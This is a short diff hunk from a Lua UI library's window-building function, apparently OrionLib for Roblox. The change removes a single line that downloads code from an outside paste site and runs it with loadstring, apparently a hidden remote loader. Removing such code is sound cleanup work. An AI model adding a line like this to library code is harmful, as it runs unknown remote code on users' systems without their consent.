@@ -1754,7 +1754,6 @@ function OrionLib:MakeWindow(WindowConfig)
 	--	end
 	--end
 	
- loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 	
 	return TabFunction
 end   
